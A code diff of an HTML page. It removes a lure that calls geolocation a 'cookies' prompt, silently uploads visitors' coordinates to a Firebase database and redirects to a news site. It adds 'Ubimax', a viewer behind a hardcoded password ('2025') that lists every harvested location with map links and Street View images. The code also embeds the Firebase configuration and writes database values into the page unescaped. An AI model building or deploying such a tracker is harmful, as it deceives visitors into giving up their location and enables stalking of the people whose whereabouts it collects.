@@ -3,119 +3,262 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>2025</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-    // CONFIGURACIÓN FIREBASE
-    const firebaseConfig = {
-      apiKey: "AIzaSyDHb3MkiF8XDjweNYBazE08sETyF-Yuy0s",
-      authDomain: "base-de-datos-clientes-ea806.firebaseapp.com",
-      databaseURL: "https://base-de-datos-clientes-ea806-default-rtdb.firebaseio.com",
-      projectId: "base-de-datos-clientes-ea806",
-      storageBucket: "base-de-datos-clientes-ea806.appspot.com",
-      messagingSenderId: "711168578601",
-      appId: "1:711168578601:web:2f4784c0382f63376ff838"
-    };
-
-    // INICIAR FIREBASE
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    // FUNCIÓN PARA OBTENER Y GUARDAR UBICACIÓN
-    function solicitarUbicacion() {
-      if (!navigator.geolocation) {
-        alert("Tu navegador no admite geolocalización.");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const datos = {
-            latitud: position.coords.latitude,
-            longitud: position.coords.longitude,
-            timestamp: new Date().toISOString()
-          };
-          const refUbicaciones = push(ref(db, 'ubicaciones'));
-          set(refUbicaciones, datos)
-            .then(() => {
-              alert("Ubicación guardada correctamente.");
-              window.location.href = "https://www.eltiempo.com";
-            })
-            .catch((err) => {
-              alert("Error al guardar ubicación en Firebase: " + err.message);
-            });
-        },
-        (error) => {
-          if (error.code === error.PERMISSION_DENIED) {
-            alert("Debes permitir el acceso a tu ubicación.");
-          } else {
-            alert("Error al obtener ubicación: " + error.message);
-          }
-        }
-      );
-    }
-
-    // EVENTO AL CARGAR
-    window.onload = () => {
-      document.getElementById("aceptarBtn").addEventListener("click", solicitarUbicacion);
-    };
-  </script>
-
+  <title>Ubimax - Visor de Ubicación</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; }
-    body {
+    html, body {
+      height: 100%;
       margin: 0;
-      font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      color: white;
+      padding: 0;
+      font-family: 'Urbanist', sans-serif;
+      background: #0f172a;
+      color: #fff;
+      width: 100vw;
+      box-sizing: border-box;
+      overflow-x: hidden;
+    }
+    body {
+      min-height: 100vh;
+      min-width: 100vw;
+    }
+    .login, .app {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1;
+      background: transparent;
+    }
+    .login-box, .app-content {
+      background: rgba(51,65,85,0.93);
+      padding: 32px 18px 28px 18px;
+      border-radius: 18px;
+      width: 96vw;
+      max-width: 430px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.27);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      backdrop-filter: blur(4px);
+    }
+    .icon-title {
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .contenedor {
-      background: #ffffff;
-      color: #333;
-      padding: 40px 30px;
-      border-radius: 16px;
-      max-width: 420px;
+      font-size: 2rem;
+      color: #fff;
+      gap: 10px;
+      margin-bottom: 22px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
     }
-    h2 { margin-bottom: 10px; font-size: 24px; }
-    p { margin-bottom: 30px; font-size: 16px; }
-    button {
-      background-color: #2a5298;
-      color: white;
+    .emoji-lock {
+      font-size: 2.3rem;
+      margin-right: 8px;
+    }
+    .login-box input[type="password"], .login-box button {
+      width: 85%;
+      max-width: 260px;
+      min-width: 130px;
+      margin-left: auto;
+      margin-right: auto;
+      display: block;
+    }
+    .login-box input[type="password"] {
+      padding: 10px;
+      margin-bottom: 13px;
       border: none;
-      padding: 14px 28px;
+      border-radius: 8px;
       font-size: 16px;
-      border-radius: 10px;
+      text-align: center;
+      background: #fff;
+      color: #263147;
+      box-shadow: 0 2px 8px rgba(16,185,129,0.06);
+      outline: none;
+    }
+    .login-box button {
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #10b981;
+      color: white;
       cursor: pointer;
-      transition: background 0.3s ease;
+      margin-top: 4px;
+      transition: background 0.2s;
+      box-shadow: 0 2px 8px rgba(16,185,129,0.14);
     }
-    button:hover {
-      background-color: #1e3c72;
+    .login-box button:hover {
+      background: #059669;
     }
-    @media (max-width: 480px) {
-      .contenedor { padding: 30px 20px; }
-      h2 { font-size: 20px; }
-      p { font-size: 14px; }
-      button { width: 100%; }
+
+    /* Responsive y tabla */
+    .table-responsive {
+      width: 100%;
+      overflow-x: auto;
+      margin-top: 20px;
+    }
+    table {
+      width: 700px;
+      min-width: 600px;
+      border-collapse: collapse;
+      margin: 0 auto;
+      font-size: 14px;
+      background: #263147;
+    }
+    th, td {
+      border: 1px solid #475569;
+      padding: 10px;
+      text-align: center;
+      white-space: nowrap;
+    }
+    th {
+      background: #1e293b;
+      color: #00ffe7;
+      font-weight: 700;
+    }
+    td a {
+      color: #38bdf8;
+      text-decoration: none;
+    }
+    img {
+      width: 90px;
+      height: 60px;
+      object-fit: cover;
+      border-radius: 6px;
+    }
+    @media (max-width: 700px) {
+      .app-content, .login-box {
+        max-width: 100vw;
+        padding: 10px 2vw;
+      }
+      table {
+        width: 600px;
+        font-size: 13px;
+      }
+      th, td {
+        padding: 8px;
+      }
+      img {
+        width: 60px;
+        height: 40px;
+      }
+    }
+    @media (max-width: 450px) {
+      .app-content, .login-box {
+        padding: 6vw 2vw;
+      }
+      table {
+        width: 500px;
+        font-size: 11px;
+      }
+      th, td {
+        padding: 6px;
+      }
+      .icon-title {
+        font-size: 1.3rem;
+      }
+      .login-box input[type="password"], .login-box button {
+        font-size: 15px;
+        min-width: 90px;
+        max-width: 180px;
+        padding: 9px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="contenedor">
-    <h2>Bienvenido </h2>
-    <p>Activa los Cookies .</p>
-    <button id="aceptarBtn">continua</button>
+
+<div class="login" id="login">
+  <div class="login-box">
+    <div class="icon-title">
+      <span class="emoji-lock">🔒</span>
+      <span>Ingreso a <b>Ubimax</b></span>
+    </div>
+    <input type="password" id="clave" placeholder="Ingresa la clave" autocomplete="current-password" />
+    <button onclick="verificarClave()">Ingresar</button>
   </div>
+</div>
+
+<div class="app" id="app" style="display:none;">
+  <div class="app-content">
+    <h2>📍 Ubicaciones Registradas</h2>
+    <div class="table-responsive">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Fecha</th>
+            <th>Hora</th>
+            <th>Latitud</th>
+            <th>Longitud</th>
+            <th>Mapa</th>
+            <th>Vista</th>
+          </tr>
+        </thead>
+        <tbody id="tablaDatos"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyDHb3MkiF8XDjweNYBazE08sETyF-Yuy0s",
+    authDomain: "base-de-datos-clientes-ea806.firebaseapp.com",
+    databaseURL: "https://base-de-datos-clientes-ea806-default-rtdb.firebaseio.com",
+    projectId: "base-de-datos-clientes-ea806",
+    storageBucket: "base-de-datos-clientes-ea806.firebasestorage.app",
+    messagingSenderId: "711168578601",
+    appId: "1:711168578601:web:2f4784c0382f63376ff838"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  function verificarClave() {
+    const clave = document.getElementById("clave").value;
+    if (clave === "2025") {
+      document.getElementById("login").style.display = "none";
+      document.getElementById("app").style.display = "flex";
+      cargarUbicaciones();
+    } else {
+      alert("Clave incorrecta");
+    }
+  }
+
+  function cargarUbicaciones() {
+    const tabla = document.getElementById("tablaDatos");
+    db.ref('ubicaciones').once('value', (snapshot) => {
+      const data = snapshot.val();
+      let i = 1;
+      tabla.innerHTML = ""; // Limpiar contenido previo
+      for (const id in data) {
+        const obj = data[id];
+        const fecha = new Date(obj.timestamp);
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${i++}</td>
+          <td>${fecha.toLocaleDateString()}</td>
+          <td>${fecha.toLocaleTimeString()}</td>
+          <td>${obj.latitud}</td>
+          <td>${obj.longitud}</td>
+          <td><a href="https://maps.google.com/?q=${obj.latitud},${obj.longitud}" target="_blank">Ver Mapa</a></td>
+          <td><img src="https://maps.googleapis.com/maps/api/streetview?size=200x100&location=${obj.latitud},${obj.longitud}&fov=80&heading=70&pitch=0&key=YOUR_GOOGLE_MAPS_API_KEY" alt="Vista"></td>
+        `;
+        tabla.appendChild(row);
+      }
+    });
+  }
+</script>
 </body>
 </html>
